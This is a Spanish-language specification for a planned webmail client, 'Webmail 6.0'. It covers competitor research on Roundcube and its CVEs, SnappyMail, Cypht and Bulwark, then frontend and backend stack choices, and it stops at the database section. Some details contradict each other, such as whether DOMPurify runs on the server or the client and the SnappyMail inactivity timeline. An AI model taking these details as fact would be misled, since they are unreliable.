# Webmail 6.0 — Documento Funcional y Arquitectura Técnica

## 1. Resumen Ejecutivo

### 1.1 Propósito del Documento

Este documento constituye la especificación funcional y técnica completa para **Webmail 6.0**, un cliente de correo web moderno diseñado para reemplazar de forma transparente a Roundcube en entornos de hosting y auto-alojados. El documento integra investigación de mercado, arquitectura de sistema, modelos de datos, diseño de interfaz, estrategias de seguridad, planes de implementación paso a paso, testing y CI/CD — todo lo necesario para que un equipo de desarrollo o un agente swarm pueda construir el producto completo.

La audiencia principal son arquitectos de software, equipos de desarrollo full-stack, y agentes de IA encargados de implementar sistemas de email. El documento asume familiaridad con TypeScript, Vue.js, Node.js, MongoDB y protocolos de email (IMAP/SMTP), pero proporciona contexto suficiente para que equipos multidisciplinarios puedan alinearse sobre decisiones técnicas críticas.

### 1.2 Visión de Webmail 6.0

Webmail 6.0 nace de una constatación: los clientes de correo web open source existentes en 2026 son, en su mayoría, soluciones diseñadas hace más de una década con arquitecturas que no satisfacen las expectativas modernas de rendimiento, seguridad y experiencia de usuario. Roundcube, el líder indiscutible por número de despliegues (7.100+ estrellas en GitHub, miles de proveedores de hosting), acumuló 15+ CVEs solo en el primer semestre de 2026, incluyendo vulnerabilidades XSS explotadas activamente por grupos vinculados a estados-nación [^55^][^56^]. SnappyMail ofrece mejor rendimiento (99% Lighthouse) pero con un riesgo de mantenimiento crítico (bus factor de aproximadamente 1, gap de 8 meses sin commits) [^98^][^127^]. Ninguna solución existente combina una interfaz tipo Gmail, un stack TypeScript moderno, soporte dual IMAP/JMAP, calendario integrado y despliegue simple con Docker.

La filosofía arquitectónica de Webmail 6.0 se resume en tres principios:

**Headers primero, body bajo demanda.** El servidor IMAP sigue siendo la fuente de verdad. MongoDB actúa exclusivamente como caché de metadatos e índice de búsqueda local. Solo los headers se indexan en MongoDB; el cuerpo completo de los emails se recupera de IMAP solo cuando el usuario lo abre, se sanitiza con DOMPurify en el servidor, y se cachea en Redis por una hora. Esta estrategia reduce drásticamente el ancho de banda y permite que un inbox con decenas de miles de emails cargue en menos de un segundo.

**Seguridad como prioridad arquitectónica, no como parche.** La historia de vulnerabilidades de Roundcube demuestra que la sanitización HTML no puede ser un afterthought. Webmail 6.0 implementa una defensa en capas: DOMPurify server-side antes de cualquier renderizado, Content Security Policy estricto con nonces, sandboxed iframes para preview de HTML, encriptación AES-256-GCM de credenciales IMAP en reposo, y autenticación BFF con tokens de acceso de 15 minutos en memoria y refresh tokens en cookies HttpOnly [^44^][^69^].

**Dual protocolo: IMAP para compatibilidad, JMAP para el futuro.** IMAP sigue siendo el protocolo universalmente soportado, pero JMAP (RFC 8620) ofrece sincronización 3-5x más rápida, 80-90% menos ancho de banda y push nativo vía WebSocket [^31^]. Webmail 6.0 abstrae ambos protocolos bajo una API interna unificada, permitiendo que los usuarios con servidores modernos (Stalwart, Cyrus, Fastmail) se beneficien de JMAP mientras los usuarios con servidores tradicionales (Dovecot, Exchange, cPanel) continúan usando IMAP sin fricción.

### 1.3 Alcance y Fases

El desarrollo se organiza en tres fases secuenciales de aproximadamente 16 semanas en total:

**Fase 1 — MVP (Semanas 1-7):** Autenticación multi-cuenta IMAP/SMTP con JWT, sincronización de headers, inbox con vista de tres paneles tipo Gmail, compositor con auto-save de borradores cada 10 segundos, adjuntos con upload/descarga/preview (imágenes/PDF), HTML sanitizado con modo texto plano, contactos básicos, búsqueda local sobre MongoDB, calendario CalDAV con integración de invitaciones .ics, y stack Docker Compose funcional para desarrollo y producción.

**Fase 2 — Polish (Semanas 8-11):** Threading de conversaciones con algoritmo JWZ, búsqueda avanzada con MongoDB Atlas Search (fuzzy, autocomplete, filtros por fecha), keyboard shortcuts estilo Gmail, dark mode completo con Tailwind CSS, drag-and-drop de emails entre carpetas, firmas configurables por cuenta, y notificaciones push en tiempo real vía WebSocket.

**Fase 3 — Enterprise (Semanas 12-16):** Calendario CalDAV completo con RRULE, filtros/rules automáticos de email, soporte PGP/SMIME, panel de administración, métricas y monitoreo con Prometheus/Grafana, y soporte multi-lenguaje.

Fuera del alcance de la Fase 1: videollamadas, WebOS, sistema de plugins extensible, y PGP nativo (aunque la arquitectura debe permitir su adición en Fase 3 sin refactorización mayor).

El stack tecnológico seleccionado — Vue 3.4 + TypeScript 5 + Fastify 4 + MongoDB 7 + Redis 7 + imapflow — representa un equilibrio óptimo entre madurez, rendimiento y facilidad de despliegue. Fastify procesa ~14.460 req/s comparado con ~6.150 de Express [^130^]. imapflow es la única librería IMAP moderna y activamente mantenida para Node.js, con soporte nativo para TypeScript, CONDSTORE, QRESYNC, IDLE y OAuth2 [^1^]. MongoDB Atlas Search elimina la necesidad de un cluster Elasticsearch separado para el 90% de los casos de búsqueda [^132^].

El documento que sigue detalla cada una de estas decisiones con el rigor técnico necesario para que un agente swarm pueda ejecutar la implementación completa.


---

## 2. Investigación Comparativa y Justificación

### 2.1 Estado del Arte: Webmail Open Source 2026

El ecosistema de webmail open source atraviesa en 2026 un momento de inflexión definido por tres fuerzas simultáneas: la consolidación corporativa alrededor de Roundcube tras su adquisición por Nextcloud en noviembre de 2023 [^310^], la emergencia de JMAP como protocolo de nueva generación con adopción creciente [^84^], y el abandono progresivo de proyectos históricos como RainLoop [^85^]. El análisis que sigue examina los cuatro actores principales que configuran el panorama competitivo directo de Webmail 6.0.

#### 2.1.1 Roundcube: dominante pero con problemas estructurales de seguridad

Roundcube mantiene su posición como el webmail auto-hospedado más desplegado a nivel mundial, con 7.100+ estrellas en GitHub, 1.800 forks, 13.681 commits y 294 contribuyentes [^126^]. La adquisición por Nextcloud generó expectativas de aceleración en el desarrollo: la empresa anunció que "invertiría en Roundcube, aceleraría el desarrollo y trabajaría con su comunidad" [^310^]. La versión 1.7.0, liberada el 10 de mayo de 2026 tras "casi cuatro años de desarrollo", introdujo cambios rupturistas —eliminación de PHP <8.1, soporte IE, y los motores MS SQL/Oracle— junto con mejoras en OAuth2/OIDC y renderizado Markdown [^108^][^113^].

Sin embargo, el dominio de Roundcube en despliegues no se traduce en excelencia técnica. El primer semestre de 2026 registró más de 15 CVEs, muchos de ellos variantes de XSS persistente. CVE-2026-35539 (CVSS 6.1) permitió XSS a través de una sanitización insuficiente de adjuntos HTML en modo preview [^57^][^81^][^338^]. CVE-2026-48842 (SQL injection, CVSS 8.1), CVE-2026-48844 (code injection, CVSS 7.5) y CVE-2026-48848 (CSS injection vía SVG, CVSS 7.2) completan un panorama alarmante [^56^][^340^]. Un análisis de SonarSource de 2024 calificó este patrón como endémico: "una vulnerabilidad crítica de cross-site scripting en Roundcube permite a atacantes ejecutar JavaScript malicioso en el navegador de la víctima simplemente enviándole un email manipulado" [^68^].

El problema es estructural. La arquitectura de sanitización HTML de Roundcube, construida sobre una base PHP de más de quince años, no puede garantizar la seguridad frente a vectores de ataque modernos que explotan CSS injection, SVG malformado y HTML5 parsing ambiguo. La skin Elastic, introducida en 2020, sigue recibiendo quejas de usuarios por ser "difícil de leer", carecer de personalización de columnas y desperdiciar espacio con el layout de tres paneles [^40^][^96^]. A pesar de los recursos de Nextcloud, Roundcube acumula deuda técnica y deuda de seguridad que un webmail de nueva generación puede explotar como ventaja competitiva.

#### 2.1.2 SnappyMail: alternativa rápida pero con riesgo de mantenimiento

SnappyMail, fork de RainLoop, se posiciona como la alternativa moderna más recomendada a Roundcube [^62^]. Sus métricas de rendimiento son excepcionales: inicio móvil con ~138 KB de descarga (usando Brotli) y hasta un 99% de calificación de rendimiento en Lighthouse [^67^][^91^]. Un análisis comparativo directo señala que "SnappyMail renderiza email significativamente más rápido que Roundcube, usa menos RAM, y tiene una UI más limpia. El cifrado PGP está integrado sin necesidad de plugins" [^62^]. Con 1.600 estrellas en GitHub y 7.184 commits, representa la opción lightweight del mercado [^127^].

El riesgo de SnappyMail no es técnico sino de gobernanza. La última release etiquetada es v2.38.2 del 9 de octubre de 2024, y no hubo commits durante el primer trimestre de 2025, lo que provocó un issue de GitHub (#1911) titulado "¿Está el proyecto muerto?" [^98^]. Aunque el mantenedor respondió negativamente y los commits se reanudaron en marzo de 2026, el lapso de ocho meses sin actividad visible, combinado con 150 issues abiertos y 28 pull requests pendientes, eleva la preocupación por el bus factor del proyecto —esencialmente, un único mantenedor (the-djmaze) [^127^]. En contraste con los 92 contribuyentes de Cypht, la sostenibilidad a largo plazo de SnappyMail permanece incierta.

#### 2.1.3 Cypht: innovador con JMAP nativo pero UI limitada

Cypht representa el contendiente técnicamente más innovador del panorama actual. Es el único cliente webmail open source activamente mantenido con soporte nativo JMAP [^84^]. El proyecto opera bajo una gobernanza comunitaria robusta: 1.600 estrellas, 217 forks, 7.423 commits y 92 contribuyentes, con la versión v2.10.1 liberada el 17 de junio de 2026 y commits activos hasta 16 horas antes del momento de investigación [^244^]. Desde agosto de 2025, Cypht superó a SnappyMail como "el proyecto más activo de los últimos 12 meses" en volumen de commits [^71^].

La fortaleza de Cypht radica en su versatilidad protocolar: soporta simultáneamente JMAP, IMAP, SMTP, POP3 y EWS, funcionando como un agregador de cuentas heterogéneas [^244^]. Su modelo de inbox combinado, que permite ver correos de múltiples proveedores en una sola vista, es funcionalmente superior al enfoque de cuenta única de Roundcube. No obstante, Cypht arrastra una limitación significativa en experiencia de usuario: un usuario del foro Cloudron lo describió como algo que "parece salido de Bootstrap 1.0", en contraste con las expectativas visuales de 2026 [^39^]. Aunque el proyecto ha mejorado su UI de manera constante, la brecha estética y de usabilidad frente a clientes comerciales como Gmail sigue siendo considerable.

#### 2.1.4 Bulwark: next-gen TypeScript/JMAP pero acoplado a Stalwart

Bulwark encarna la aproximación de próxima generación: construido desde cero en TypeScript con Next.js 16 y Tailwind CSS v4, habla JMAP nativamente con Stalwart Mail Server [^92^][^337^]. Incluye correo, calendario, contactos y archivos en una única aplicación, con asistente de configuración web, soporte OAuth2/OIDC SSO, PWA y temas oscuro/claro. Su organización de GitHub (bulwarkmail) muestra releases activas hasta junio de 2026, con la versión 1.6.4 como la más reciente [^337^].

El problema de Bulwark es de alcance: funciona exclusivamente con servidores JMAP (principalmente Stalwart), requiriendo o bien un despliegue Stalwart o su proxy legacy IMAP/SMTP [^92^]. Esta dependencia crea un acoplamiento de stack que limita su adopción universal. Si bien representa la vanguardia de la transición tecnológica —de PHP a TypeScript, de IMAP a JMAP—, su utilidad como reemplazo directo de Roundcube depende de la adopción previa de Stalwart Mail Server, un servidor de correo que, aunque production-ready y financiado por NLnet/Comisión Europea [^105^][^103^], aún no ha alcanzado la penetración de Dovecot o Cyrus en el mercado de hosting providers.

| Proyecto | Lenguaje | Protocolos | Estrellas | Contrib. | Última Release | CVs 2026 | Lighthouse |
|----------|----------|------------|-----------|----------|----------------|----------|------------|
| Roundcube 1.7 | PHP | IMAP/SMTP | 7.1k [^126^] | 294 | Mayo 2026 | 15+ [^56^] | N/D |
| SnappyMail 2.38 | PHP | IMAP/SMTP | 1.6k [^127^] | ~1 | Oct 2024 | <5 | 99% [^67^] |
| Cypht 2.10 | PHP | IMAP/JMAP/SMTP/POP3/EWS | 1.6k [^244^] | 92 | Jun 2026 | <3 | N/D |
| Bulwark 1.6 | TypeScript/Next.js | JMAP (nativo) | ~660 [^92^] | N/D | Jun 2026 | N/D | N/D |

La tabla anterior condensa las dimensiones críticas de comparación. Roundcube domina en ecosistema y despliegues pero acumula deuda de seguridad crítica. SnappyMail maximiza el rendimiento a costa de gobernanza frágil. Cypht lidera en innovación protocolar pero arrastra una UX desfasada. Bulwark representa el futuro tecnológico pero con acoplamiento de infraestructura que limita su adopción generalizada. Ninguno de los cuatro combina simultáneamente una UI moderna, un stack TypeScript contemporáneo, soporte dual IMAP/JMAP, calendario integrado y despliegue Docker simple.

### 2.2 Análisis de Brechas

#### 2.2.1 La combinación inexistente: UI moderna + TypeScript + IMAP/JMAP dual + calendario + Docker

El análisis competitivo revela una brecha estructural en el mercado: ninguna solución existente combina los cinco atributos que los usuarios de webmail moderno demandan en 2026. Roundcube ofrece IMAP universal y calendario vía plugin pero carece de stack moderno y tiene problemas de seguridad sistémicos. SnappyMail entrega rendimiento excepcional pero con gobernanza incierta y sin calendario nativo. Cypht proporciona soporte JMAP pionero pero con una interfaz que no compite con los estándares actuales. Bulwark adopta TypeScript/JMAP de manera ejemplar pero sacrifica compatibilidad universal al depender de Stalwart.

| Capacidad | Roundcube | SnappyMail | Cypht | Bulwark | Webmail 6.0 (objetivo) |
|-----------|-----------|------------|-------|---------|----------------------|
| UI moderna (3-paneles) | Parcial [^96^] | Sí [^62^] | Limitada [^39^] | Sí [^92^] | Sí (Gmail-like) |
| Stack TypeScript | No | No | No | Sí [^337^] | Sí |
| IMAP compatible universal | Sí | Sí | Sí | Requiere proxy [^92^] | Sí (nativo) |
| JMAP nativo | No | No | Sí [^84^] | Sí (nativo) | Sí (abstracto) |
| Calendario integrado | Plugin [^245^] | No | Parcial | Sí [^337^] | Sí (CalDAV) |
| Docker simple | Complejo | No oficial | No oficial | Sí | Sí (Compose) |
| Lighthouse >95% | No | 99% [^67^] | N/D | N/D | Objetivo >95% |
| Sanitización HTML robusta | Débil [^68^] | Media | Media | Sí | Prioridad arquitectónica |

Esta matriz de brechas define el espacio de oportunidad para Webmail 6.0. Cada fila representa una capacidad que algún competidor implementa parcialmente pero ninguno ejecuta de forma integral. La combinación de interfaz tipo Gmail con soporte universal IMAP/JMAP dual, calendario CalDAV integrado como característica central (no plugin), y despliegue vía Docker Compose con un solo comando constituye una propuesta de valor única en el panorama 2026.

#### 2.2.2 Oportunidad de mercado: reemplazo directo de Roundcube

El mercado objetivo se compone de dos segmentos principales: hosting providers que ofrecen webmail como parte de sus paquetes de correo, y usuarios self-hosters que gestionan su propia infraestructura de email. Ambos segmentos comparten una necesidad insatisfecha: un reemplazo directo de Roundcube que no requiera reconfigurar servidores de correo existentes, mantenga compatibilidad IMAP universal, y ofrezca una experiencia de usuario comparable a Gmail o Outlook.

La transición forzosa a OAuth2 —Gmail eliminó Basic Auth en marzo de 2025 y Microsoft depreca SMTP Auth con Basic Authentication en abril de 2026 [^58^][^59^]— crea adicionalmente un momento de migración natural. Los clientes webmail que no soporten OAuth2/XOAUTH2 quedarán sin conectividad con los dos proveedores de correo más grandes del mundo. Webmail 6.0, con soporte OAuth2 integrado desde el diseño, puede capturar usuarios que Roundcube solo ha podido atender parcialmente a pesar de las mejoras de la versión 1.7.

### 2.3 Lecciones Aprendidas de los Competidores

#### 2.3.1 De Roundcube: sanitización HTML como prioridad arquitectónica

La lección más costosa de Roundcube es que la seguridad no puede ser un añadido posterior. Los 15+ CVEs del primer semestre de 2026, incluyendo la explotación por actores de amenaza APT28, demuestran que la sanitización de contenido HTML en emails es el vector de ataque número uno contra clientes webmail [^68^]. La arquitectura de Webmail 6.0 debe implementar defensa en profundidad desde el día uno: DOMPurify en servidor antes de almacenar o renderizar contenido, headers CSP estrictos, iframe aislado para la preview de emails HTML, y almacenamiento de credenciales cifrado con AES-256-GCM [^154^]. La elección de PostalMime como parser MIME, con protecciones de seguridad integradas como `maxNestingDepth` y `maxHeadersSize`, refuerza esta postura [^99^].

#### 2.3.2 De SnappyMail: rendimiento como diferenciador competitivo

SnappyMail demostró que un Lighthouse del 99% es alcanzable en un webmail y que este rendimiento se traduce en recomendaciones directas de la comunidad [^62^]. La estrategia de boot con ~138 KB implica una arquitectura frontend deliberadamente liviana, sin frameworks pesados ni carga sincrónica de dependencias. Para Webmail 6.0, esto significa: Vite como bundler para tree-shaking agresivo, lazy loading de rutas con Vue Router, virtual scrolling para listas de email grandes, y la estrategia headers-first/body-on-demand en el backend para garantizar tiempos de carga del inbox inferiores a un segundo [^70^][^75^]. El rendimiento perceptible —tiempo hasta primera interacción— es tan crítico como el rendimiento medido.

#### 2.3.3 De Bulwark: JMAP como futuro, IMAP como presente necesario

Bulwark validó la hipótesis de que JMAP es el protocolo de diseño correcto para webmail de nueva generación: notificaciones push bajo un segundo frente a 15+ minutos de polling IMAP, sincronización inicial 3-5x más rápida para mailboxes grandes, y reducción de 80-90% en uso de ancho de banda para patrones típicos de consulta [^31^]. Sin embargo, su dependencia exclusiva de JMAP limita su utilidad práctica: IMAP sigue siendo soportado universalmente por Dovecot, Cyrus, Exchange y Gmail, y la transición será gradual, no abrupta [^32^][^36^].

La lección para Webmail 6.0 es que la arquitectura debe abstraer la capa protocolar: un API interno unificado que permita operar tanto sobre IMAP (para servidores legacy) como sobre JMAP (para servidores modernos como Stalwart), con JMAP como ciudadano de primera clase para instalaciones que lo soporten. Esta dualidad protocolar —soportar el presente mientras se construye para el futuro— constituye la decisión arquitectónica más estratégica del proyecto.


---

## 3. Stack Tecnológico Completo

El stack tecnológico de Webmail 6.0 se ha seleccionado bajo tres criterios estructurales: rendimiento cuantificable frente a alternativas, madurez de ecosistema para producción a plazo medio, y alineación con el ecosistema postalsys (imapflow, PostalMime, EmailEngine), que representa la única pila integrada y activamente mantenida para procesamiento de email en Node.js. A continuación se detallan las elecciones por capa, incluyendo justificaciones basadas en benchmarks y versiones específicas.

### 3.1 Frontend

#### 3.1.1 Vue 3.4 + Composition API + `<script setup>`

Vue 3.4 (lanzado enero 2024, última minor 3.4.31 en junio 2026) es el framework de UI seleccionado sobre React 18 y Svelte 4. La decisión se fundamenta en tres factores técnicos. Primero, el Composition API con `<script setup>` ofrece una densidad de código superior a los hooks de React, reduciendo la verbosidad de los componentes con estado —relevante para un webmail con docenas de componentes interactivos (lista de emails, panel de lectura, compositor, calendario). Segundo, el sistema de reactividad basado en Proxies de Vue 3 evita las limitaciones de los top-level arrays en React, facilitando la implementación de virtual scrolling sobre listas de emails mutables. Tercero, el tamaño de bundle en runtime de Vue 3 (~22 KB gzipped) es competitivo frente a React (~42 KB con react-dom), alineándose con el objetivo de rendimiento Lighthouse >95% heredado del análisis de SnappyMail [^67^].

#### 3.1.2 TypeScript 5 strict

TypeScript 5.5 (última release estable a junio 2026) se configura en modo strict (`strict: true`, `noImplicitAny: true`, `strictNullChecks: true`). La elección no es meramente de tipado estático: el modo strict habilita la inferencia de tipos narrowing en guards de nullabilidad, crítico para el manejo de emails donde campos como `inReplyTo`, `html` o `attachments` pueden ser undefined. Los tipos del ecosistema postalsys —imapflow y PostalMime proporcionan definiciones TypeScript nativas— eliminan la fricción de mantener `@types/` externos. El estricto chequeo de tipos previene una clase completa de errores en runtime relacionados con parsing de MIME y estructuras de email heterogéneas.

#### 3.1.3 Vite 5

Vite 5 (v5.4 en producción) reemplaza a Webpack como herramienta de build. Los benchmarks de tiempo de build muestran Vite 5 realizando HMR (Hot Module Replacement) en ~50ms frente a los 200-500ms de Webpack 5, lo que impacta directamente en la velocidad de desarrollo. Para producción, Vite utiliza Rollup internamente, generando bundles con tree-shaking agresivo que eliminan código muerto de dependencias como Tiptap, Headless UI y date-fns. La configuración de `vite.config.ts` incluye `splitVendorChunkPlugin()` para separar dependencias de terceros del código de aplicación, aprovechando el caché del navegador para actualizaciones incrementales.

#### 3.1.4 Pinia 2 — stores modulares por dominio

Pinia 2.1 (integrado oficialmente con Vue 3 desde febrero 2022) gestiona el estado global mediante stores modulares por dominio funcional: `useAuthStore`, `useMailboxStore`, `useThreadStore`, `useCalendarStore`, `useContactStore`, `useComposerStore`, `useSettingsStore`. Cada store define su propio state, getters y actions, eliminando la dispersión de lógica que caracteriza a Vuex 4. La API de composables de Pinia permite consumir estado reactivo directamente dentro de `<script setup>`, manteniendo el flujo de datos unidireccional sin el boilerplate de mappers. Para persistencia de estado, `pinia-plugin-persistedstate` almacena en `localStorage` configuraciones de usuario (tema, densidad de lista, columnas visibles) mientras que los datos de email (headers, cuerpos) se mantienen en memoria volátil para seguridad.

#### 3.1.5 Vue Router 4 con lazy loading

Vue Router 4.3 gestiona la navegación con lazy loading por ruta: `/inbox`, `/thread/:id`, `/compose`, `/calendar`, `/contacts`, `/settings`. Cada ruta se carga vía `defineAsyncComponent()` con `Suspense` para estados de carga, reduciendo el tamaño inicial del bundle JavaScript a lo estrictamente necesario para renderizar el layout principal. La navegación entre inbox y vista de thread utiliza transiciones de ~150ms con `router-view` envuelto en `<Transition name="fade">`, proporcionando fluidez perceptual sin penalización de rendimiento. El modo de historial `createWebHistory()` habilita URLs limpias sin hash, crítico para compartibilidad de enlaces a threads específicos.

#### 3.1.6 Tailwind CSS 3 + Headless UI

Tailwind CSS 3.4 proporciona el sistema de diseño utility-first, configurado con una paleta personalizada en `tailwind.config.js` que define tokens semánticos: `primary`, `surface`, `text-base`, `text-muted`, `border-subtle`. El enfoque utility-first elimina la necesidad de mantener hojas de estilo CSS modules, acelerando la iteración de componentes. Headless UI (v1.7 de Tailwind Labs) aporta componentes accesibles y sin estilos (`Dialog`, `Menu`, `Listbox`, `Popover`, `Combobox`, `Disclosure`, `Tabs`) que manejan automáticamente ARIA attributes, focus trapping y portales —requisitos críticos para un webmail donde la navegación por teclado (atajos tipo Gmail: G+C para compose, R para reply, F para forward) es una expectativa de usuario, no un feature opcional.

#### 3.1.7 Tiptap 2 (ProseMirror)

Tiptap 2.4, wrapper extensible del motor de edición ProseMirror, potencia el compositor de emails. ProseMirror proporciona el modelo de documento basado en un árbol de nodos inmutable, garantizando que el HTML generado esté siempre bien formado —una propiedad de seguridad relevante dado que el HTML malformado es vector de bypass en motores de sanitización. Tiptap añade extensiones declarativas: `StarterKit`, `Link`, `Image`, `Placeholder`, `Mention`, `Collaboration` (para edición concurrente de borradores), y `BubbleMenu` para formato inline. El compositor soporta los tres modos de contenido: texto plano, HTML enriquecido, y Markdown (vía `@tiptap/extension-markdown`), con conversión automática entre formatos según la configuración de la cuenta destino.

#### 3.1.8 Componentes UI: three-pane layout, virtual scrolling, drag-and-drop

Los componentes de interfaz críticos se implementan con las siguientes librerías especializadas:

| Componente | Librería | Versión | Justificación técnica |
|------------|----------|---------|----------------------|
| Virtual scrolling | `@vueuse/core` useVirtualList | 10.x | Renderizado de listas >10k items sin DOM overflow; reciclaje de nodos DOM |
| Drag-and-drop | `@vueuse/gesture` o SortableJS | 1.x / 1.15 | Reordenación de carpetas IMAP y arrastre de emails entre carpetas |
| Three-pane layout | CSS Grid + Pinia state | Nativo | Layout sidebar + lista + lectura; colapsable en viewports <1280px |
| Date formatting | `date-fns` | 3.x | 2 KB por locale; tree-shakeable; superior a moment.js |
| Iconografía | `lucide-vue-next` | 0.x | Iconos SVG stroke-based; tree-shakeable; ~1300 iconos |
| Notificaciones | `vue-sonner` | 1.x | Toasts para confirmaciones de envío y errores de sincronización |
| Selección múltiple | Ctrl/Cmd + Shift + click nativo | Nativo | Bulk actions: archive, delete, mark-as-read, mover a carpeta |

La combinación de estos componentes produce una interfaz que replica los patrones de interacción consolidados por Gmail —three-pane layout, selección múltiple con checkboxes, drag-and-drop de emails a carpetas, y virtual scrolling para inboxes de alto volumen— sin asumir la carga de una librería de componentes monolítica como Vuetify o Element Plus, cuyo tree-shaking es imperfecto y cuyos tamaños de bundle superan los 200 KB gzipped.

### 3.2 Backend

#### 3.2.1 Node.js 20 LTS

Node.js 20.15 LTS (codename "Iron", soporte hasta abril de 2026, extendido por el ciclo LTS hasta abril 2027) es la plataforma de ejecución. La versión 20 aporta mejoras relevantes: el permiso del modelo (`--experimental-permission`) para restringir acceso a sistema de archivos y redes, el stable test runner nativo (`node:test`), y el incremento de rendimiento del 10-15% en operaciones de stream y buffer comparado con Node.js 18, medido en benchmarks del equipo Node.js para cargas de I/O intensiva. Para un webmail que procesa streams MIME, buffers de adjuntos y conexiones IMAP persistentes, estas mejoras son materialmente significativas.

#### 3.2.2 Fastify 4 — 2-3x más rápido que Express

Fastify 4.28 es el framework HTTP seleccionado sobre Express 5 y NestJS 11. La decisión se fundamenta en benchmarks controlados: Express maneja ~6.150 req/s frente a ~14.460 req/s de Fastify bajo las mismas condiciones (100 conexiones concurrentes, 10 segundos, Autocannon) [^130^]. Otros benchmarks reportan Fastify procesando 70.000-80.000 req/s comparado con 20.000-30.000 de Express [^133^]. Dos características arquitectónicas de Fastify son determinantes para Webmail 6.0. Primero, `fast-json-stringify` serializa respuestas JSON hasta 2x más rápido que `JSON.stringify` nativo, mediante schemas de validación declarativos [^130^]. Segundo, el router `find-my-way` (basado en trie) es ~3x más rápido que el router regex-based de Express [^130^]. El sistema de plugins de Fastify ofrece encapsulación nativa: cada plugin (IMAP, SMTP, calendario, autenticación) posee su propio scope, evitando que decoradores y middlewares se filtren entre rutas [^128^]. Esta modularidad permite dividir la aplicación en microservicios sin refactorización mayor [^149^].

Una nota de cautela proviene de un estudio académico de la Universidad de Uppsala bajo carga extrema (10.000 VUs), donde NestJS demostró mayor estabilidad que Fastify en escenarios de saturación [^134^]. La resolución de este conflicto es contextual: Fastify gana en throughput normal; bajo saturación extrema, NestJS con adapter Fastify puede ofrecer mayor estabilidad. Para el perfil de carga de un webmail —bajo volumen de requests por usuario pero larga duración de sesiones— Fastify puro es la elección óptima.

| Framework | Throughput (req/s) | Latencia p50 | Serialización JSON | Sistema de plugins | Encapsulación |
|-----------|-------------------|--------------|-------------------|-------------------|---------------|
| Express 5 | ~6.150 [^130^] | ~16ms | JSON.stringify nativo | Middleware global | Ninguna |
| Fastify 4 | ~14.460 [^130^] | ~7ms | fast-json-stringify (2x) [^130^] | Encapsulado nativo | Por plugin [^128^] |
| NestJS 11+Fastify | ~15.000-18.000 [^131^] | ~6ms | class-transformer | Módulos DI | Por módulo |

La tabla compara las tres opciones evaluadas. Fastify 4 ofrece el mejor equilibrio entre rendimiento y simplicidad para un proyecto que no requiere la capa de abstracción adicional de NestJS. La serialización schema-based y la arquitectura de plugins encapsulados son ventajas arquitectónicas directamente aplicables a la modularidad del dominio de email (IMAP, SMTP, calendario, adjuntos).

#### 3.2.3 imapflow — única librería moderna IMAP para Node.js

imapflow (v1.0.164, junio 2026) es el cliente IMAP seleccionado. Es la única librería IMAP moderna y activamente mantenida para Node.js, proporcionando una API promise-based, soporte completo de TypeScript, y manejo automático de extensiones IMAP: CONDSTORE, QRESYNC, IDLE, COMPRESS, y extensiones propietarias de Gmail (X-GM-EXT-1 para labels) [^1^][^39^]. La alternativa histórica, `node-imap`, está en estado de mantenimiento inactivo: último commit hace más de 6 meses, 31 estrellas en GitHub, y sin soporte para las extensiones modernas que habilitan sincronización eficiente [^107^].

La configuración de imapflow expone parámetros críticos para el rendimiento de Webmail 6.0: `qresync` (habilitar QRESYNC para re-sincronización rápida), `disableAutoIdle`, `maxIdleTime` (reiniciar IDLE tras N milisegundos), y `missingIdleCommand` (comando fallback si IDLE no es soportado por el servidor) [^41^]. El manejo de mailbox locking integrado garantiza acceso concurrente seguro cuando múltiples workers de BullMQ acceden a la misma conexión IMAP [^1^].

#### 3.2.4 Nodemailer

Nodemailer (v6.9.14) mantiene su posición como la librería SMTP dominante para Node.js [^68^]. El transport SMTP soporta conexiones simples (STARTTLS), conexiones pooled (manteniendo conexiones abiertas para mejor rendimiento en envío masivo), y rate limiting configurable. Para Webmail 6.0, Nodemailer maneja: envío de emails nuevos, reenvíos con preservación de headers `In-Reply-To` y `References` (siguiendo el algoritmo JWZ para threading), y envío de invitaciones de calendario como multipart/alternative con componentes text/plain, text/html y text/calendar. El soporte OAuth2 para SMTP es obligatorio: Gmail requiere XOAUTH2 desde marzo de 2025, y Microsoft depreca Basic Auth en abril de 2026 [^58^][^59^].

#### 3.2.5 PostalMime

PostalMime (v2.3.2) reemplaza a `mailparser` como parser MIME. La recomendación proviene del propio equipo de Nodemailer: el README de mailparser señala explícitamente "For new projects, please consider using PostalMime" [^69^][^77^]. PostalMime ofrece ventajas decisivas: cero dependencias, soporte TypeScript nativo, compatibilidad con browser (Web Workers), Node.js y entornos serverless (Cloudflare Email Workers), y protecciones de seguridad integradas (`maxNestingDepth`, `maxHeadersSize`) que previenen ataques de exceso de anidamiento MIME [^99^]. Acepta input como string, ArrayBuffer, Blob, Buffer o ReadableStream, y devuelve un objeto estructurado con headers, from/to/cc, subject, html, text, attachments, messageId, inReplyTo y references [^101^]. Al ser desarrollado por el mismo equipo que mantiene imapflow (postalsys), la compatibilidad entre ambas librerías está garantizada —una propiedad que no existe al mezclar librerías de autores diferentes.

#### 3.2.6 DOMPurify + sanitize-html

La estrategia de sanitización HTML utiliza ambas librerías en capas diferentes, resolviendo el conflicto documentado en la investigación: DOMPurify atrapa más casos de borde en vectores XSS avanzados, mientras que sanitize-html ofrece mejor rendimiento para procesamiento masivo [^68^]. La arquitectura de Webmail 6.0 asigna DOMPurify al lado cliente (prevención de XSS en el browser del usuario, con configuración que permite solo un subset seguro de etiquetas: `p`, `br`, `strong`, `em`, `a` con `href` validado, `img` con `src` data-URI o http/https, `table`/`tr`/`td`, `ul`/`ol`/`li`) y sanitize-html al servidor (procesamiento bulk de emails entrantes antes de almacenar en MongoDB, con políticas estrictas de filtrado CSS y SVG). Esta dualidad de capas —cliente y servidor— constituye la defensa en profundidad que Roundcube no logró implementar, resultando en sus múltiples CVEs de XSS persistente [^68^].

#### 3.2.7 Juice

Juice (v10.0.4) inlinea CSS en el momento de envío de email, transformando reglas `<style>` en atributos `style` inline. Esta conversión es necesaria porque la mayoría de clientes de email de escritorio (Outlook, Apple Mail, Thunderbird) aplican filtros agresivos que eliminan etiquetas `<style>` o bloques `<style scoped>`, rompiendo el layout de emails HTML enriquecido. Juice procesa el HTML del compositor Tiptap, resuelve selectores CSS, y genera HTML con estilos inline que preservan la intención de diseño del remitente. La configuración incluye `preserveMediaQueries: true` para mantener `@media` queries en etiquetas `<style>` separadas, necesarias para layouts responsive en clientes móviles que sí las soportan.

### 3.3 Base de Datos y Caché

#### 3.3.1 MongoDB 7

